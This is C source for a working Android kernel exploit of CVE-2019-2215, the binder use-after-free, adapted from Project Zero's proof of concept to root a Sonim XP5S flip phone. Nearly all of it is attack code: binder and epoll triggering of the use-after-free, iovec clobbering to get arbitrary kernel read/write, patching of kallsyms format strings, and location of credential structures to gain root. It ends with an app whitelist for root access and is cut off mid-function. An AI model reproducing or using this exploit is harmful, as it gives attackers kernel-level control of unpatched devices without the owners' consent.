/*
 * POC to gain arbitrary kernel R/W access using CVE-2019-2215
 * https://bugs.chromium.org/p/project-zero/issues/detail?id=1942
 *
 * Jann Horn & Maddie Stone of Google Project Zero
 * Some stuff from Grant Hernandez to achieve root (Oct 15th 2019)
 * Modified by Alexander R. Pruss for 3.18 kernels where WAITQUEUE_OFFSET is 0x98
 *
 * October 2019
 *
 * Modified for Sonim xp5s by flipphoneguy
*/

// paths
#define WHITELIST_PATH "/data/data/com.flipphoneguy.root/files/whitelist.txt"
#define DENIED_PATH "/data/data/com.flipphoneguy.root/files/blacklist.txt"
#define PACKAGES_LIST "/data/system/packages.list"
#define MAX_PACKAGE_NAME 256
// $ uname -a
// Linux localhost 3.18.71-perf+ #1 SMP PREEMPT Tue Jul 17 14:44:34 KST 2018 aarch64
#define KERNEL_BASE 0xffffffc000080000ul
#define OFFSET__thread_info__flags 0x000
#define OFFSET__task_struct__stack 0x008
#define OFFSET__cred__uid 0x004
#define OFFSET__cred__securebits 0x024
#define OFFSET__cred__cap_permitted 0x030
#define OFFSET__cred__cap_effective (OFFSET__cred__cap_permitted+0x008)
#define OFFSET__cred__cap_bset (OFFSET__cred__cap_permitted+0x010)

#define BINDER_SET_MAX_THREADS 0x40046205ul
#define MAX_THREADS 3

#define RETRIES 3

#define NO_PROC_KALLSYMS
#undef KALLSYMS_CACHING
#define KSYM_NAME_LEN 128

//Not needed, but saved for future use; the offsets are for LGV20 LS998
//#define OFFSET__task_struct__seccomp 0x9b0 
//#define OFFSET__cred__user_ns 0x088 // if you define this, the first run might be a little faster
//#define OFFSET__task_struct__cred 0x550
#define OFFSET__cred__security 0x078
#define OFFSET__cred__cap_inheritable 0x028
#define OFFSET__cred__cap_ambient 0x048
//#define OFFSET__task_struct__mm 0x308


#define _GNU_SOURCE
#include <time.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <ctype.h>
#include <sys/uio.h>
#include <err.h>
#include <sched.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <linux/sched.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <errno.h>
#include <stdarg.h>

#define DELAY_USEC 500000

#define MIN(x, y) ((x) < (y) ? (x) : (y))
#define MAX(x, y) ((x) > (y) ? (x) : (y))

#define BINDER_THREAD_EXIT 0x40046208ul
// NOTE: we don't cover the task_struct* here; we want to leave it uninitialized
#define BINDER_THREAD_SZ 0x188
#define IOVEC_ARRAY_SZ (BINDER_THREAD_SZ / 16) //25
#define WAITQUEUE_OFFSET (0x98)
#define IOVEC_INDX_FOR_WQ (WAITQUEUE_OFFSET / 16) //10
#define UAF_SPINLOCK 0x10001
#define PAGE 0x1000ul
#define TASK_STRUCT_OFFSET_FROM_TASK_LIST 0xE8

int quiet = 1;

int have_kallsyms = 0;
int kernel3 = 1;

struct kallsyms {
    unsigned long addresses;
    unsigned long names;
    unsigned long num_syms;
    unsigned long token_table;
    unsigned long markers;
    char* token_table_data;
    unsigned short token_index_data[256];
} kallsyms;

void message(char *fmt, ...)
{
    if (quiet)
        return;
    va_list ap;
    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
    putchar('\n');
}

void error(char* fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    vfprintf(stderr, fmt, ap);
    va_end(ap);
    fprintf(stderr, ": %s\n", errno ? strerror(errno) : "error");
    exit(1);
}

int isKernelPointer(unsigned long p) {
    return p >= KERNEL_BASE; 
}

unsigned long kernel_read_ulong(unsigned long kaddr);

void hexdump_memory(void *_buf, size_t byte_count)
{
    unsigned char *buf = _buf;
    unsigned long byte_offset_start = 0;
    if (byte_count % 16)
        error( "hexdump_memory called with non-full line");
    for (unsigned long byte_offset = byte_offset_start; byte_offset < byte_offset_start + byte_count;
         byte_offset += 16)
    {
        char line[1000];
        char *linep = line;
        linep += sprintf(linep, "%08lx  ", byte_offset);
        for (int i = 0; i < 16; i++)
        {
            linep += sprintf(linep, "%02hhx ", (unsigned char)buf[byte_offset + i]);
        }
        linep += sprintf(linep, " |");
        for (int i = 0; i < 16; i++)
        {
            char c = buf[byte_offset + i];
            if (isalnum(c) || ispunct(c) || c == ' ')
            {
                *(linep++) = c;
            }
            else
            {
                *(linep++) = '.';
            }
        }
        linep += sprintf(linep, "|");
        puts(line);
    }
}

int epfd;

int binder_fd;

unsigned long iovec_size(struct iovec *iov, int n)
{
    unsigned long sum = 0;
    for (int i = 0; i < n; i++)
        sum += iov[i].iov_len;
    return sum;
}

unsigned long iovec_max_size(struct iovec *iov, int n)
{
    unsigned long m = 0;
    for (int i = 0; i < n; i++)
    {
        if (iov[i].iov_len > m)
            m = iov[i].iov_len;
    }
    return m;
}

int clobber_data(unsigned long payloadAddress, const void *src, unsigned long payloadLength)
{
    int dummyBufferSize = MAX(UAF_SPINLOCK, PAGE);
    char *dummyBuffer = malloc(dummyBufferSize);
    if (dummyBuffer == NULL)
        error( "allocating dummyBuffer");

    memset(dummyBuffer, 0, dummyBufferSize);

    message("PARENT: clobbering at 0x%lx", payloadAddress);

    struct epoll_event event = {.events = EPOLLIN};
    int max_threads = 2;  
    ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max_threads);
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event))
        error( "epoll_add");

    unsigned long testDatum = 0;
    unsigned long const testValue = 0xABCDDEADBEEF1234ul;

    struct iovec iovec_array[IOVEC_ARRAY_SZ];
    memset(iovec_array, 0, sizeof(iovec_array));

#define SECOND_WRITE_CHUNK_IOVEC_ITEMS 3

    unsigned long second_write_chunk[SECOND_WRITE_CHUNK_IOVEC_ITEMS * 2] = {
        (unsigned long)dummyBuffer,
        /* iov_base (currently in use) */ // wq->task_list->next
            SECOND_WRITE_CHUNK_IOVEC_ITEMS * 0x10,
        /* iov_len (currently in use) */ // wq->task_list->prev

        payloadAddress, //(unsigned long)current_ptr+0x8, // current_ptr+0x8, // current_ptr + 0x8, /* next iov_base (addr_limit) */
        payloadLength,

        (unsigned long)&testDatum,
        sizeof(testDatum),
    };

    int delta = (UAF_SPINLOCK + sizeof(second_write_chunk)) % PAGE;
    int paddingSize = delta == 0 ? 0 : PAGE - delta;

    iovec_array[IOVEC_INDX_FOR_WQ - 1].iov_base = dummyBuffer;
    iovec_array[IOVEC_INDX_FOR_WQ - 1].iov_len = paddingSize;
    iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummyBuffer;
    iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0;                              // spinlock: will turn to UAF_SPINLOCK
    iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = second_write_chunk;        // wq->task_list->next: will turn to payloadAddress of task_list
    iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = sizeof(second_write_chunk); // wq->task_list->prev: will turn to payloadAddress of task_list
    iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_base = dummyBuffer;               // stuff from this point will be overwritten and/or ignored
    iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len = UAF_SPINLOCK;
    iovec_array[IOVEC_INDX_FOR_WQ + 3].iov_base = dummyBuffer;
    iovec_array[IOVEC_INDX_FOR_WQ + 3].iov_len = payloadLength;
    iovec_array[IOVEC_INDX_FOR_WQ + 4].iov_base = dummyBuffer;
    iovec_array[IOVEC_INDX_FOR_WQ + 4].iov_len = sizeof(testDatum);
    int totalLength = iovec_size(iovec_array, IOVEC_ARRAY_SZ);

    int pipes[2];
    pipe(pipes);
    if ((fcntl(pipes[0], F_SETPIPE_SZ, PAGE)) != PAGE)
        error( "pipe size");
    if ((fcntl(pipes[1], F_SETPIPE_SZ, PAGE)) != PAGE)
        error( "pipe size");

    pid_t fork_ret = fork();
    if (fork_ret == -1)
        error( "fork");
    if (fork_ret == 0)
    {
        /* Child process */
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        usleep(DELAY_USEC);
        message("CHILD: Doing EPOLL_CTL_DEL.");
        epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
        message("CHILD: Finished EPOLL_CTL_DEL.");

        char *f = malloc(totalLength);
        if (f == NULL)
            error( "Allocating memory");
        memset(f, 0, paddingSize + UAF_SPINLOCK);
        unsigned long pos = paddingSize + UAF_SPINLOCK;
        memcpy(f + pos, second_write_chunk, sizeof(second_write_chunk));
        pos += sizeof(second_write_chunk);
        memcpy(f + pos, src, payloadLength);
        pos += payloadLength;
        memcpy(f + pos, &testValue, sizeof(testDatum));
        pos += sizeof(testDatum);
        write(pipes[1], f, pos);
        message("CHILD: wrote %lu", pos);
        close(pipes[1]);
        close(pipes[0]);
        exit(0);
    }

    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
    int b = readv(pipes[0], iovec_array, IOVEC_ARRAY_SZ);

    message("PARENT: readv returns %d, expected %d", b, totalLength);

    if (testDatum != testValue)
        message( "PARENT: **fail** clobber value doesn't match: is %lx but should be %lx", testDatum, testValue);
    else
        message("PARENT: clobbering test passed");

    free(dummyBuffer);
    close(pipes[0]);
    close(pipes[1]);

    return testDatum == testValue;
}

int leak_data(void *leakBuffer, int leakAmount,
               unsigned long extraLeakAddress, void *extraLeakBuffer, int extraLeakAmount,
               unsigned long *task_struct_ptr_p, unsigned long *kstack_p)
{
    unsigned long const minimumLeak = TASK_STRUCT_OFFSET_FROM_TASK_LIST + 8;
    unsigned long adjLeakAmount = MAX(leakAmount, 4336); // TODO: figure out why we need at least 4336; I would think that minimumLeak should be enough
    
    int success = 1;

    struct epoll_event event = {.events = EPOLLIN};
    int max_threads = 2;  
    ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max_threads);
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event))
        error( "epoll_add");

    struct iovec iovec_array[IOVEC_ARRAY_SZ];

    memset(iovec_array, 0, sizeof(iovec_array));

    int delta = (UAF_SPINLOCK + minimumLeak) % PAGE;
    int paddingSize = (delta == 0 ? 0 : PAGE - delta) + PAGE;

    iovec_array[IOVEC_INDX_FOR_WQ - 2].iov_base = (unsigned long *)0xDEADBEEF;
    iovec_array[IOVEC_INDX_FOR_WQ - 2].iov_len = PAGE;
    iovec_array[IOVEC_INDX_FOR_WQ - 1].iov_base = (unsigned long *)0xDEADBEEF;
    iovec_array[IOVEC_INDX_FOR_WQ - 1].iov_len = paddingSize - PAGE;
    iovec_array[IOVEC_INDX_FOR_WQ].iov_base = (unsigned long *)0xDEADBEEF;
    iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0;                                /* spinlock: will turn to UAF_SPINLOCK */
    iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = (unsigned long *)0xDEADBEEF; /* wq->task_list->next */
    iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = adjLeakAmount;                /* wq->task_list->prev */
    iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_base = (unsigned long *)0xDEADBEEF; // we shouldn't get to here
    iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len = extraLeakAmount + UAF_SPINLOCK + 8;
    unsigned long totalLength = iovec_size(iovec_array, IOVEC_ARRAY_SZ);
    unsigned long maxLength = iovec_size(iovec_array, IOVEC_ARRAY_SZ);
    unsigned char *dataBuffer = malloc(maxLength);

    if (dataBuffer == NULL)
        error( "Allocating %ld bytes", maxLength);

    for (int i = 0; i < IOVEC_ARRAY_SZ; i++)
        if (iovec_array[i].iov_base == (unsigned long *)0xDEADBEEF)
            iovec_array[i].iov_base = dataBuffer;

    int b;
    int pipefd[2];
    int leakPipe[2];
    if (pipe(pipefd))
        error( "pipe");
    if (pipe(leakPipe))
        err(2, "pipe");
    if ((fcntl(pipefd[0], F_SETPIPE_SZ, PAGE)) != PAGE)
        error( "pipe size");
    if ((fcntl(pipefd[1], F_SETPIPE_SZ, PAGE)) != PAGE)
        error( "pipe size");

    pid_t fork_ret = fork();
    if (fork_ret == -1)
        error( "fork");
    if (fork_ret == 0)
    {
        /* Child process */
        char childSuccess = 1;
        
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        usleep(DELAY_USEC);
        message("CHILD: Doing EPOLL_CTL_DEL.");
        epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
        message("CHILD: Finished EPOLL_CTL_DEL.");

        unsigned long size1 = paddingSize + UAF_SPINLOCK + minimumLeak;
        message("CHILD: initial portion length 0x%lx", size1);
        char buffer[size1];
        memset(buffer, 0, size1);
        if (read(pipefd[0], buffer, size1) != size1)
            error( "reading first part of pipe");

        memcpy(dataBuffer, buffer + size1 - minimumLeak, minimumLeak);
        
        int badPointer = 0;
        if (memcmp(dataBuffer, dataBuffer + 8, 8))
            badPointer = 1;
        unsigned long addr = 0;
        memcpy(&addr, dataBuffer, 8);

        if (!isKernelPointer(addr)) {
            badPointer = 1;
            childSuccess = 0;
        }
        
        unsigned long task_struct_ptr = 0;

        memcpy(&task_struct_ptr, dataBuffer + TASK_STRUCT_OFFSET_FROM_TASK_LIST, 8);
        message("CHILD: task_struct_ptr = 0x%lx", task_struct_ptr);

        if (!badPointer && (extraLeakAmount > 0 || kstack_p != NULL))
        {
            unsigned long extra[6] = {
                addr,
                adjLeakAmount,
                extraLeakAddress,
                extraLeakAmount,
                task_struct_ptr + 8,
                8};
            message("CHILD: clobbering with extra leak structures");
            if (clobber_data(addr, &extra, sizeof(extra))) 
                message("CHILD: clobbered");
            else {
                message("CHILD: **fail** iovec clobbering didn't work");
                childSuccess = 0;
            }
        }

        errno = 0;
        if (read(pipefd[0], dataBuffer + minimumLeak, adjLeakAmount - minimumLeak) != adjLeakAmount - minimumLeak)
            error("leaking");

        write(leakPipe[1], dataBuffer, adjLeakAmount);

        if (extraLeakAmount > 0)
        {
            message("CHILD: extra leak");
            if (read(pipefd[0], extraLeakBuffer, extraLeakAmount) != extraLeakAmount) {
                childSuccess = 0;
                error( "extra leaking");
            }
            write(leakPipe[1], extraLeakBuffer, extraLeakAmount);
            //hexdump_memory(extraLeakBuffer, (extraLeakAmount+15)/16*16);
        }
        if (kstack_p != NULL)
        {
            if (read(pipefd[0], dataBuffer, 8) != 8) {
                childSuccess = 0;
                error( "leaking kstack");
            }
            message("CHILD: task_struct_ptr = 0x%lx", *(unsigned long *)dataBuffer);
            write(leakPipe[1], dataBuffer, 8);
        }
        write(leakPipe[1], &childSuccess, 1);

        close(pipefd[0]);
        close(pipefd[1]);
        close(leakPipe[0]);
        close(leakPipe[1]);
        message("CHILD: Finished write to FIFO.");
        
        if (badPointer) {
            errno = 0;
            message("CHILD: **fail** problematic address pointer, e.g., %lx", addr);
        }
        exit(0);
    }
    message("PARENT: soon will be calling WRITEV");
    errno = 0;
    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
    b = writev(pipefd[1], iovec_array, IOVEC_ARRAY_SZ);
    message("PARENT: writev() returns 0x%x", (unsigned int)b);
    if (b != totalLength) {
        message( "PARENT: **fail** writev() returned wrong value: needed 0x%lx", totalLength);
        success = 0;
        goto DONE;
    }

    message("PARENT: Reading leaked data");

    b = read(leakPipe[0], dataBuffer, adjLeakAmount);
    if (b != adjLeakAmount) {
        message( "PARENT: **fail** reading leak: read 0x%x needed 0x%lx", b, adjLeakAmount);
        success = 0;
        goto DONE;
    }

    if (leakAmount > 0)
        memcpy(leakBuffer, dataBuffer, leakAmount);

    if (extraLeakAmount != 0)
    {
        message("PARENT: Reading extra leaked data");
        b = read(leakPipe[0], extraLeakBuffer, extraLeakAmount);
        if (b != extraLeakAmount) {
            message( "PARENT: **fail** reading extra leak: read 0x%x needed 0x%lx", b, extraLeakAmount);
            success = 0;
            goto DONE;
        }
    }

    if (kstack_p != NULL)
    {
        if (read(leakPipe[0], kstack_p, 8) != 8) {
            message( "PARENT: **fail** reading leaked kstack");
            success = 0;
            goto DONE;
        }
    }
    
    char childSucceeded=0;
    
    read(leakPipe[0], &childSucceeded, 1);
    if (!childSucceeded)
        success = 0;
    

    if (task_struct_ptr_p != NULL)
        memcpy(task_struct_ptr_p, dataBuffer + TASK_STRUCT_OFFSET_FROM_TASK_LIST, 8);

DONE:    
    close(pipefd[0]);
    close(pipefd[1]);
    close(leakPipe[0]);
    close(leakPipe[1]);

    int status;
    wait(&status);
    //if (wait(&status) != fork_ret) error( "wait");

    free(dataBuffer);

    if (success) 
        message("PARENT: leaking successful");
    
    return success;
}

int kernel_rw_pipe[2];

struct kernel_buffer {
    unsigned char pageBuffer[PAGE];
    unsigned long pageBufferOffset;
} kernel_buffer = { .pageBufferOffset = 0 };

void reset_kernel_pipes()
{
    kernel_buffer.pageBufferOffset = 0;
    close(kernel_rw_pipe[0]);
    close(kernel_rw_pipe[1]);
    if (pipe(kernel_rw_pipe))
        error( "kernel_rw_pipe");
}

int raw_kernel_write(unsigned long kaddr, void *buf, unsigned long len)
{
    if (len > PAGE)
        error( "kernel writes over PAGE_SIZE are messy, tried 0x%lx", len);
    if (write(kernel_rw_pipe[1], buf, len) != len ||
        read(kernel_rw_pipe[0], (void *)kaddr, len) != len)
    {
        reset_kernel_pipes();
        return 0;
    }
    return len;
}

void kernel_write(unsigned long kaddr, void *buf, unsigned long len)
{
    if (len != raw_kernel_write(kaddr, buf, len))
        error( "error with kernel writing");
}

int raw_kernel_read(unsigned long kaddr, void *buf, unsigned long len)
{
    if (len > PAGE)
        error( "kernel writes over PAGE_SIZE are messy, tried 0x%lx", len);
    if (write(kernel_rw_pipe[1], (void *)kaddr, len) != len || read(kernel_rw_pipe[0], buf, len) != len)
    {
        reset_kernel_pipes();
        return 0;
    }
    return len;
}

void kernel_read(unsigned long kaddr, void *buf, unsigned long len)
{
    if (len > PAGE)
        error( "kernel reads over PAGE_SIZE are messy, tried 0x%lx", len);
    if (len != raw_kernel_read(kaddr, buf, len))
        error( "error with kernel reading");
}

unsigned char kernel_read_uchar(unsigned long offset) {
    if (kernel_buffer.pageBufferOffset == 0 || offset < kernel_buffer.pageBufferOffset || kernel_buffer.pageBufferOffset+PAGE <= offset) {
        kernel_buffer.pageBufferOffset = offset & ~(PAGE-1);
        kernel_read(kernel_buffer.pageBufferOffset, kernel_buffer.pageBuffer, PAGE);
    }
    return kernel_buffer.pageBuffer[offset-kernel_buffer.pageBufferOffset];
}

unsigned long kernel_read_ulong(unsigned long kaddr)
{
    unsigned long data;
    kernel_read(kaddr, &data, sizeof(data));
    return data;
}
unsigned long kernel_read_uint(unsigned long kaddr)
{
    unsigned int data;
    kernel_read(kaddr, &data, sizeof(data));
    return data;
}
void kernel_write_ulong(unsigned long kaddr, unsigned long data)
{
    kernel_write(kaddr, &data, sizeof(data));
}
void kernel_write_uint(unsigned long kaddr, unsigned int data)
{
    kernel_write(kaddr, &data, sizeof(data));
}
void kernel_write_uchar(unsigned long kaddr, unsigned char data)
{
    kernel_write(kaddr, &data, sizeof(data));
}


// Make the kallsyms module not check for permission to list symbol addresses
int fixKallsymsFormatStrings(unsigned long start)
{
    errno = 0;
    
    int found = 0;

    start &= ~(PAGE - 1);

    unsigned long searchTarget;

    memcpy(&searchTarget, "%pK %c %", 8);

    int backwards = 1;
    int forwards = 1;
    int direction = 1;
    unsigned long forwardAddress = start;
    unsigned long backwardAddress = start - PAGE;
    unsigned long page[PAGE / 8];
    
    message("MAIN: searching for kallsyms format strings");

    while ((backwards || forwards) && found < 2)
    {
        unsigned long address = direction > 0 ? forwardAddress : backwardAddress;

        if (address < 0xffffffc000000000ul || address >= 0xffffffd000000000ul || raw_kernel_read(address, page, PAGE) != PAGE)
        {
            if (direction > 0)
                forwards = 0;
            else
                backwards = 0;
        }
        else
        {
            for (int i = 0; i < PAGE / 8; i++)
                if (page[i] == searchTarget)
                {
                    unsigned long a = address + 8 * i;

                    char fmt[16];

                    kernel_read(a, fmt, 16);

                    if (!strcmp(fmt, "%pK %c %s\t[%s]\x0A"))
                    {
                        found++;
                        kernel_write(a, "%p %c %s\t[%s]\x0A", 15);
                        message("MAIN: patching longer version at %lx", a);
                    }
                    else if (!strcmp(fmt, "%pK %c %s\x0A"))
                    {
                        found++;
                        kernel_write(a, "%p %c %s\x0A", 10);
                        message("MAIN: patching shorter version at %lx", a);
                    }

                    if (found >= 2)
                        return 2;
                }
        }

        if (direction > 0)
            forwardAddress += PAGE;
        else
            backwardAddress -= PAGE;

        direction = -direction;

        if (direction < 0 && !backwards)
        {
            direction = 1;
        }
        else if (direction > 0 && !forwards)
        {
            direction = -1;
        }
    }

    return found;
}

int verifyCred(unsigned long cred_ptr) {
    unsigned uid;
    if (cred_ptr < 0xffffff0000000000ul || 4 != raw_kernel_read(cred_ptr+OFFSET__cred__uid, &uid, 4))
        return 0;
    return uid == getuid();
}

int getCredOffset(unsigned char* task_struct_data, char* execName) {
    char taskname[16];
    char* p = strrchr(execName, '/');
    if (p == NULL)
        p = execName;
    else
        p++;
    unsigned n = MIN(strlen(p)+1, 16);
    memcpy(taskname, p, n);
    taskname[15] = 0; 
    
    for (int i=OFFSET__task_struct__stack+8; i<PAGE-16; i+=8) {
        if (0 == memcmp(task_struct_data+i, taskname, n) && verifyCred(*(unsigned long*)(task_struct_data+i-8)))
            return i-8;
    }
        
    errno=0;
    error("Cannot find cred structure");
    return -1;
}

int getSeccompOffset(unsigned char* task_struct_data, unsigned credOffset, unsigned seccompStatus) {
    if (seccompStatus != 2)
        return -1;
    
    unsigned long firstGuess = -1;
    
    for (int i=credOffset&~7; i<PAGE-24; i+=8) {
        struct {
            unsigned long seccomp_status;
            unsigned long seccomp_filter;
            unsigned int parent_exe;
            unsigned int child_exe;
        } *p = (void*)(task_struct_data+i);
        
        if (p->seccomp_status == seccompStatus && isKernelPointer(p->seccomp_filter)) {
            if (p->child_exe == p->parent_exe + 1) {
                return i;
            }
            else {
                if (firstGuess < 0)
                    firstGuess = i;
            }
        }
    }
    
    return firstGuess;
}

unsigned long countIncreasingEntries(unsigned long start) {
    unsigned long count = 1;
    unsigned long prev = kernel_read_ulong(start);
    do {
        start += 8;
        unsigned long v = kernel_read_ulong(start);
        if (v < prev)
            return count;
        count++;
    } while(1);
}

int find_kallsyms_addresses(unsigned long searchStart, unsigned long searchEnd, unsigned long* startP, unsigned long* countP) {
    if (searchStart == 0)
        searchStart = KERNEL_BASE;
    if (searchEnd == 0)
        searchEnd = searchStart + 0x4000000;
    unsigned long foundStart = 0;
        
    unsigned char page[PAGE];
    for (unsigned long i=searchStart; i<searchEnd ; i+=PAGE) {
        kernel_read(i, page, PAGE);
        for (int j=0; j<PAGE; j+=0x100) {
           if (*(unsigned long*)(page+j)==KERNEL_BASE) {
               unsigned long count = countIncreasingEntries(i+j);
                if (count > 50000) {
                   *startP = i+j;
                   *countP = count;
                   return 1;
                }
           }
        }
    }
    return 0;
}

int get_kallsym_name(unsigned long offset, char* name) {
    unsigned char length = kernel_read_uchar(offset++);
    
    for (unsigned char i = 0; i < length ; i++) {
        int index = kallsyms.token_index_data[kernel_read_uchar(offset++)];
        int n = strlen(kallsyms.token_table_data+index);
        memcpy(name, kallsyms.token_table_data+index, n);
        name += n;
    }
    *name = 0;
    
    return 1+length;
}

int loadKallsyms() {
    if (have_kallsyms)
        
        return 1;
    if (!find_kallsyms_addresses(0, 0, &kallsyms.addresses, &kallsyms.num_syms))
        return 0;
    
    message("MAIN: kallsyms names start at 0x%lx and have %ld entries", kallsyms.addresses, kallsyms.num_syms);
    unsigned long offset = kallsyms.addresses + 8 * kallsyms.num_syms;

    message("MAIN: kallsyms names end at 0x%lx", offset);    
    struct kernel_buffer buf = {.pageBufferOffset = 0};

    offset = (offset + 0xFFul) & ~0xFFul;

    unsigned long count = kernel_read_ulong(offset);
    offset += 8;
    
    if (count != kallsyms.num_syms) {
        message("MAIN: **fail** kallsym entry count mismatch %ld", count);
    }

    offset = (offset + 0xFFul) & ~0xFFul;

    kallsyms.names = offset;
    
    for (unsigned long i = 0 ; i < kallsyms.num_syms ; i++) {
        unsigned char len = kernel_read_uchar(offset++);
        offset += len;
    }
    
    offset = (offset + 0xFF) & ~0xFFul;
    
    kallsyms.markers = offset;
    
    offset += 8 * ((kallsyms.num_syms + 255ul) / 256ul);
    
    offset = (offset + 0xFF) & ~0xFFul;

    kallsyms.token_table = offset;

    int tokens = 0;
    
    while (tokens < 256) {
        if (kernel_read_uchar(offset++) == 0)
            tokens++;
    }
    
    unsigned long token_table_length = offset - kallsyms.token_table;
    
    kallsyms.token_table_data = malloc(token_table_length);
    
    errno = 0;
    if (kallsyms.token_table_data == NULL)
        error("allocating token table");
    
    for (unsigned long i = 0 ; i < token_table_length ; i++)
        kallsyms.token_table_data[i] = kernel_read_uchar(kallsyms.token_table + i);
    
    offset = (offset + 0xFF) & ~0xFFul;
    
    kernel_read(offset, kallsyms.token_index_data, sizeof(kallsyms.token_index_data));
    
    have_kallsyms = 1;
    
    return 1;
}

unsigned long findSymbol_memory_search(char* symbol) {
    message("MAIN: searching for kallsyms table");
    if (! loadKallsyms()) {
        message("MAIN: **fail** cannot find kallsyms table");
    }
    
    unsigned long offset = kallsyms.names;
    char name[KSYM_NAME_LEN];
    
    for(unsigned long i = 0; i < kallsyms.num_syms; i++) {
        unsigned int n = get_kallsym_name(offset, name);
        if (!strcmp(name+1, symbol)) {
            message( "found symbol in kernel memory", symbol);
            
            return kernel_read_ulong(kallsyms.addresses + i*8);
        }
        offset += n;
    }
    
    return 0;
}

char* allocateSymbolCachePathName(char* execName, char* symbol) {
    char* p = strrchr(execName, '/');
    unsigned n;
    if (p == NULL)
        n = 0;
    else
        n = p-execName+1;

    char* pathname = malloc(strlen(symbol)+7+1+n);
    if (pathname == NULL) {
        errno = 0;
        error("allocating memory for pathname");
    }
    strncpy(pathname, execName, n);
    pathname[n] = 0;
    strcat(pathname, symbol);
    strcat(pathname, ".symbol");

    return pathname;
}

unsigned long findSymbol_in_cache(char* execName, char* symbol) {
    char* pathname = allocateSymbolCachePathName(execName, symbol);
    unsigned long address = 0;
    
    FILE *cached = fopen(pathname, "r");
    if (cached != NULL) {
        fscanf(cached, "%lx", &address);
        fclose(cached);
    }
    
    free(pathname);
    
    return address;
}

void cacheSymbol(char* execName, char* symbol, unsigned long address) {
#ifdef KALLSYMS_CACHING
    if (address != 0 && address != findSymbol_in_cache(execName, symbol)) {
        char* pathname = allocateSymbolCachePathName(execName, symbol);
        FILE *cached = fopen(pathname, "w");
        if (cached != NULL) {
            fprintf(cached, "%lx\n", address);
            fclose(cached);
            char* cmd = alloca(10+strlen(pathname)+1);
            sprintf(cmd, "chmod 666 %s", pathname);
            system(cmd);
            message("cached %s", pathname);
        }
        free(pathname);
    }
#endif
}
    
unsigned long findSymbol(char* execName, unsigned long pointInKernelMemory, char *symbol)
{
    unsigned long address = 0;
    
#ifdef KALLSYMS_CACHING    
    address = findSymbol_in_cache(execName, symbol);
    if (address != 0)
        return address;
#endif
    
#ifdef NO_PROC_KALLSYMS
    address = findSymbol_memory_search(symbol);
#else    
    char buf[1024];
    buf[0] = 0;
    errno = 0;
    
    FILE *ks = fopen("/proc/kallsyms", "r");
    if (ks == NULL) {
        return findSymbol_memory_search(symbol);
    }
    fgets(buf, 1024, ks);
    if (ks != NULL)
        fclose(ks);
    
    if ( (buf[0] == 0 || strncmp(buf, "0000000000000000", 16) == 0) && fixKallsymsFormatStrings(pointInKernelMemory) == 0)
    {
        message( "MAIN: **partial failure** cannnot fix kallsyms format string");
        address = findSymbol_memory_search(symbol);
    }
    else {
        ks = fopen("/proc/kallsyms", "r");
        while (NULL != fgets(buf, sizeof(buf), ks)) 
        {
            unsigned long a;
            unsigned char type;
            char sym[1024];
            sscanf(buf, "%lx %c %s", &a, &type, sym);
            if (!strcmp(sym, symbol)) {
                message( "found %s in /proc/kallsyms", sym);
                address = a;
                break;
            }
        }

        fclose(ks);
    }
#endif

    return address;
}

void checkKernelVersion() {
    kernel3 = 1;
    FILE *k = fopen("/proc/version", "r");
    if (k != NULL) {
        char buf[1024]="";
        fgets(buf, sizeof(buf), k);
        if (NULL != strstr(buf, "Linux version 4"))
            kernel3 = 0;
    }
    if (kernel3) message("MAIN: detected kernel version 3");
        else message("MAIN: detected kernel version other than 3");
}


void getPackageName(unsigned uid, char* packageName) {
    if (uid == 0) { strcpy(packageName, "root"); return; }
    if (uid == 2000) { strcpy(packageName, "shell"); return; }
    
    strcpy(packageName, "unknown");
    
    FILE* f = fopen(PACKAGES_LIST, "r");
    if (f == NULL) return;

    char line[1024];
    char name[MAX_PACKAGE_NAME];
    unsigned int id;

    while (fgets(line, sizeof(line), f)) {
        if (sscanf(line, "%s %u", name, &id) == 2) {
            if (id == uid) {
                strncpy(packageName, name, MAX_PACKAGE_NAME);
                packageName[MAX_PACKAGE_NAME-1] = 0;
                break;
            }
        }
    }
    fclose(f);
}

int checkWhitelist(unsigned uid) {
    if (uid == 0 || uid == 2000) return 1;

    char parent[MAX_PACKAGE_NAME];
    getPackageName(uid, parent);

    if (!strcmp(parent, "com.termux")) {return 1;}

    FILE *wl = fopen(WHITELIST_PATH, "r");
    int strict_mode = 0;

    if (wl != NULL) {
        fseek(wl, 0, SEEK_END);
        if (ftell(wl) > 0) {
            strict_mode = 1;
            rewind(wl);
            
            char line[512];
            while (fgets(line, sizeof(line), wl)) {
                char *p = line;
                while (*p && isspace(*p)) p++;
                char *q = p + strlen(p) - 1;
                while (q > p && isspace(*q)) *q-- = 0;
                
                if (q <= p || *p == '#') continue;

                if (*q == '*') {
                    if (!strncmp(parent, p, q - p)) { 
                        fclose(wl);
                        return 1; 
                    }
                } else if (!strcmp(parent, p)) {
                    fclose(wl);
                    return 1; 
                }
            }
        }
        fclose(wl);
    }

    if (strict_mode) {
        message("MAIN: denied by strict whitelist: %s", parent);
